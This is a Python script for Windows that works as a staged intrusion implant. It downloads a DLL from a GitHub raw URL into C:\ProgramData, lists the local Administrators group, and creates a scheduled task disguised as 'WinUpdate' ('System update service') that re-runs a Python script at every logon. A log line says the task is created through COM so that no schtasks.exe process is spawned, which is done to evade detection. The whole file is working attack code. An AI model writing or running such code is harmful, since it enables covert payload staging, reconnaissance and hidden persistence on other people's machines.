import os
import subprocess
import urllib.request

# ═══════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════
dll_url   = "https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/main/dll/TEST_Dll1.dll"
dll_path  = r"C:\ProgramData\TEST_Dll1.dll"
log_path  = r"C:\ProgramData\stage1.log"
self_py   = r"C:\ProgramData\hklib.py"
self_exe  = r"C:\ProgramData\py3\python.exe"
task_name = "WinUpdate"

# ═══════════════════════════════════════════════
# PHASE 1: DLL Staging (download only if not present)
# ═══════════════════════════════════════════════
if os.path.exists(dll_path):
    with open(log_path, 'a') as f:
        f.write(f"[SKIP] DLL already staged at {dll_path}\n")
else:
    try:
        urllib.request.urlretrieve(dll_url, dll_path)
        with open(log_path, 'a') as f:
            f.write(f"[OK] DLL staged to {dll_path}\n")
    except Exception as e:
        with open(log_path, 'a') as f:
            f.write(f"[ERR] Download failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 2: Local Admin Enumeration (always runs)
# ═══════════════════════════════════════════════
try:
    result = subprocess.run(
        ['net', 'localgroup', 'Administrators'],
        capture_output=True, text=True
    )
    with open(log_path, 'a') as f:
        f.write("=== Local Admin Group ===\n")
        f.write(result.stdout)
        f.write("=========================\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] Enumeration failed: {e}\n")

# ═══════════════════════════════════════════════
# PHASE 3: Self-Persistence (COM-based Scheduled Task)
# ═══════════════════════════════════════════════
try:
    import win32com.client
    
    scheduler = win32com.client.Dispatch("Schedule.Service")
    scheduler.Connect()
    root = scheduler.GetFolder("\\")
    
    # Check if task already exists
    try:
        existing_task = root.GetTask(task_name)
        with open(log_path, 'a') as f:
            f.write(f"[SKIP] Task '{task_name}' already exists.\n")
    except:
        # Task doesn't exist, create it
        task_def = scheduler.NewTask(0)
        task_def.RegistrationInfo.Description = "System update service"
        task_def.Settings.Enabled = True
        task_def.Settings.Hidden = False
        
        # Trigger: at logon
        trigger = task_def.Triggers.Create(9)  # TASK_TRIGGER_LOGON
        
        # Action: run python script
        action = task_def.Actions.Create(0)  # TASK_ACTION_EXEC
        action.Path = self_exe
        action.Arguments = f'"{self_py}"'
        
        # Register the task (no elevation required for current user)
        root.RegisterTaskDefinition(
            task_name,
            task_def,
            6,  # TASK_CREATE_OR_UPDATE
            None,  # User (None = current user)
            None,  # Password
            3      # TASK_LOGON_INTERACTIVE_TOKEN
        )
        
        with open(log_path, 'a') as f:
            f.write(f"[OK] Self-persistence established via COM Task '{task_name}' (no schtasks.exe spawned).\n")
            
except ImportError:
    with open(log_path, 'a') as f:
        f.write("[ERR] win32com module not available. Install: pip install pywin32\n")
except Exception as e:
    with open(log_path, 'a') as f:
        f.write(f"[ERR] COM task creation failed: {e}\n")
